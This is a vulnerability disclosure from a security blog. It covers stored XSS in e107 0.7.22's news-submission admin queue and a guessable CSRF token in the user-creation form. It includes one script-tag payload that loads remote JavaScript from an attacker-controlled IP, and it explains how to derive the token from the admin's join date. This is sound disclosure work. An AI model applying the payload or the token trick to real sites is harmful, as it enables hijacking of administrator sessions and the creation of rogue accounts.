=== Content from www.madirish.net_707c4650_20250125_133432.html ===


# [Mad Irish . net](https://www.madirish.net)

* [about](https://www.madirish.net/about "About me")
* contact
* [rss](https://www.madirish.net/rss.php "RSS feed")
* [github](https://github.com/madirish "Work")
* [LAMPSecurity](https://sourceforge.net/projects/lampsecurity/ "CTF")

# e107 XSS and XSRF Vulnerabilities

[disclosure](/tag/disclosure) [xss](/tag/xss)
30 November -0001
#### Description of Vulnerability:

e107 (<http://e107.org>) is a PHP/MySQL based content management system. e107 allows anonymous users to submit news items for display on the front page. These items enter a queue for review by admins and are subsequently approved or rejected.

e107 suffers from cross site scripting (XSS) vulnerabilities because it fails to properly sanitize user supplied input when rendering submitted news item titles for administrative review. Malicious users can submit news at the default submitnews.php URL. e107 sanitizes single quotes to prevent against SQL injection but does not alter double quotes or HTML tags. An attacker could embed a piece of JavaScript, such as '<script type="text/javascript" src="http://172.16.46.129/xsrf.js"/>' before or after their title and this script would execute silently when an administrator viewed the approval queue at e107\_admin/newspost.php?sn.

e107 suffers from a cross site request forgery (XSRF) vulnerability because it fails to use a difficult to discover random token in the user add form located at e107\_admin/users.php?create. The token is carried in a hidden form field 'ac' and is derived from the MD5 hash of the administrative user accounts create date. When the administrative account is created the unix timestamp is stored in the MySQL database in the e107\_user.user\_pwchange column. Because logged in users can view the 'Joined' state of the admin user at /user.php?id.1 it is easy to derive the unix timestamp for the creation date of the account.

#### Systems affected

e107 0.7.22 was tested and shown to be vulnerable

#### Impact

Unauthenticated users can exploit these vulnerabilities to attack other users, potentially compromising the e107 service or host.

#### Vendor Response

Upgrade to the latest version of e107 to mitigate these vulnerabilities.

### Tags

* [apple](/tag/apple)
* [arbitrary\_code\_execution](/tag/arbitrary_code_execution)
* [blue\_team](/tag/blue_team)
* [disclosure](/tag/disclosure)
* [drupal](/tag/drupal)
* [editorial](/tag/editorial)
* [encryption](/tag/encryption)
* [exploit](/tag/exploit)
* [feature](/tag/feature)
* [how\_to](/tag/how_to)
* [html5](/tag/html5)
* [ios](/tag/ios)
* [iot](/tag/iot)
* [javascript](/tag/javascript)
* [linux](/tag/linux)
* [malware](/tag/malware)
* [mysql](/tag/mysql)
* [network](/tag/network)
* [osx](/tag/osx)
* [pen\_test](/tag/pen_test)
* [php](/tag/php)
* [privacy](/tag/privacy)
* [purple\_team](/tag/purple_team)
* [random](/tag/random)
* [raspberry\_pi](/tag/raspberry_pi)
* [research](/tag/research)
* [review](/tag/review)
* [sql](/tag/sql)
* [sql\_injection](/tag/sql_injection)
* [threat\_intel](/tag/threat_intel)
* [tools](/tag/tools)
* [tutorial](/tag/tutorial)
* [vuln](/tag/vuln)
* [web\_application](/tag/web_application)
* [windows](/tag/windows)
* [xss](/tag/xss)

[Copyright](http://www.madirish.net/copyright "My copyright statement") Â© Justin C. Klein Keane. Unauthorized reproduction is a violation of US and international law.


